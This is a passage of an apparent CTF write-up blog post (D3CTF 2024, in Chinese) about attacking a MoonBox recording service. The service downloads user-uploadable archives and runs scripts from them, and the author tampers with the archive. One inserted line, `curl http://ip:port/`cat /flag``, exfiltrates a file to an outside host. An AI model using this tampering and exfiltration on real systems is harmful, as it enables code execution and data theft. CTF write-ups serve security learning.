+<p>部署参考👉<a target="_blank" rel="noopener" href="https://github.com/vivo/MoonBox/blob/main/docs/%E6%9C%88%E5%85%89%E5%AE%9D%E7%9B%92Docker%E9%83%A8%E7%BD%B2%E6%89%8B%E5%86%8C.md">https://github.com/vivo/MoonBox/blob/main/docs/%E6%9C%88%E5%85%89%E5%AE%9D%E7%9B%92Docker%E9%83%A8%E7%BD%B2%E6%89%8B%E5%86%8C.md</a></p>
+<p>运行录制后发现如下日志：</p>
+<blockquote>
+<p>任务启动参数:curl -o sandboxDownLoad.tar <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/api/agent/downLoadSandBoxZipFile">http://127.0.0.1:8080/api/agent/downLoadSandBoxZipFile</a> &amp;&amp; curl -o moonboxDownLoad.tar <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/api/agent/downLoadMoonBoxZipFile">http://127.0.0.1:8080/api/agent/downLoadMoonBoxZipFile</a> &amp;&amp; rm -fr ~&#x2F;sandbox &amp;&amp; rm -fr ~&#x2F;.sandbox-module &amp;&amp;  tar  -xzf sandboxDownLoad.tar -C ~&#x2F; &gt;&gt; &#x2F;dev&#x2F;null &amp;&amp; tar  -xzf moonboxDownLoad.tar -C ~&#x2F; &gt;&gt; &#x2F;dev&#x2F;null &amp;&amp; dos2unix ~&#x2F;sandbox&#x2F;bin&#x2F;sandbox.sh &amp;&amp; dos2unix ~&#x2F;.sandbox-module&#x2F;bin&#x2F;start-remote-agent.sh &amp;&amp; rm -f moonboxDownLoad.tar sandboxDownLoad.tar &amp;&amp; sh ~&#x2F;.sandbox-module&#x2F;bin&#x2F;start-remote-agent.sh moon-box-web rc_id_2748e656671eb9e899fa493818e87140%26http%3A%2F%2F127.0.0.1%3A8080%26INFO%26INFO</p>
+</blockquote>
+<p>下载了两个压缩文件，解压，然后运行了一些sh脚本</p>
+<p>这两个压缩文件用户可以上传</p>
+<p><img src="/./../img/image-20240428100343265.png" srcset="/img/loading.gif" lazyload alt="image-20240428100343265"></p>
+<p>由于是题目公共厕所环境，直接访问<code>/api/agent/downLoadMoonBoxZipFile</code>就能拿到上一个人构造的压缩文件，自己改一下就好了</p>
+<p><img src="/./../img/image-20240428100601854.png" srcset="/img/loading.gif" lazyload alt="image-20240428100601854"></p>
+<p>修改<code>start-remote-agent.sh</code>，第一行添加</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://ip:port/`<span class="hljs-built_in">cat</span> /flag`<br></code></pre></td></tr></table></figure>
+
+<p><code>d3ctf&#123;fuck_d3chain_i_forget_delete_test&#125;</code></p>
+<p>看这个flag估计是出题人另一道题d3chain的附件泄露题解了?呜呜呜可惜了</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>D3CTF 2024 wp</div>
+      <div>http://example.com/2024/04/27/d3_2024/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年4月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/15/htb-2/" title="htb-2">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">htb-2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/12/thymeleaf/" title="thymeleaf模板注入">
+                        <span class="hidden-mobile">thymeleaf模板注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
